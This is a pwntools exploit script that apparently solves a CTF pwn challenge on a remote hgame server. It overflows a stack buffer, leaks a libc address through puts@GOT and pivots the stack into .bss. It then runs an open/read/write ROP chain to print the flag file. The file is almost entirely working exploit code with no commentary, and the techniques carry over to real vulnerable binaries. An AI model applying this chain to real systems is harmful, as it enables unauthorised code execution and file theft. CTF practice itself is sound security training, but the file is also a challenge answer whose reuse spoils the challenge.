# -*- coding: UTF-8 -*-
from pwn import *
from pwnlib.util.iters import mbruteforce 

context.log_level = 'debug'
context.terminal = ["/bin/tmux","sp","-h"]
context(arch='amd64',os='linux')
io = remote('week-1.hgame.lwsec.cn',32305)
# libc = ELF('./libc-2.31.so')
#io = process('./vuln')
elf = ELF('./vuln')
libc = ELF('./libc-2.31.so')

l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))

#charset = string.printable
## charset = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" 
#hash_code = io.recvuntil('\n', drop=True).decode().strip() 
## lg('hash_code')
#log.success('hash_code={}'.format(hash_code)) 
#passstr = mbruteforce(lambda x: hashlib.sha256((x).encode()).hexdigest() == hash_code, charset, 4, method='fixed') 
#sla('pass:',passstr)

def add(idx,size):
	sl('1')
	sla('Index?\n',str(idx))
	sla('Size?\n',str(size))
def show(idx):
	sl('2')
	sla('Index?\n',str(idx))
	
def edit(idx,content):
	sl('3')
	sla('Index?\n',str(idx))
	sa('content:\n',content)
		
def delete(idx):
	sl('4')
	sla('Index?\n',str(idx))
rop = ROP('./vuln')
roplibc = ROP('./libc-2.31.so')

pop_rdi = rop.rdi.address

putsplt = elf.plt['puts']
putsgot = elf.got['puts']
readplt = elf.plt['read']
leave_ret = 0x4012EE
start = 0x4010B0
bssaddr = 0x404060 + 0x200

pay = '\x00'*0x108
pay += p64(pop_rdi) +p64(putsgot)+p64(putsplt)+p64(start)
sla('solve this task.\n',pay)

libcbase = l64() - libc.symbols['puts']
lg('libcbase')

pop_rsi = roplibc.rsi.address + libcbase
pop_rdx = roplibc.rdx.address + libcbase
openaddr = libc.symbols['open'] + libcbase
readaddr = libc.symbols['read'] + libcbase
writeaddr = libc.symbols['write'] + libcbase
lg('pop_rsi')
lg('pop_rdx')

pay = '\x00'*0x100
pay += p64(bssaddr) +p64(pop_rsi)+p64(bssaddr)+p64(readplt)+p64(leave_ret)
#dbg()
pause()

sla('solve this task.\n',pay)

rop = p64(pop_rdi) + p64(bssaddr + 0xa0) + p64(pop_rsi) + p64(0) + p64(openaddr) #open
rop += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(bssaddr+0x100) + p64(pop_rdx) +p64(0x30) + p64(readaddr)#read
rop += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(bssaddr+0x100) + p64(pop_rdx) +p64(0x30) + p64(writeaddr) # write
rop = rop.ljust(0x90,'\x00')
rop += './flag\x00'
pay = p64(0) + rop
sn(pay)

irt()


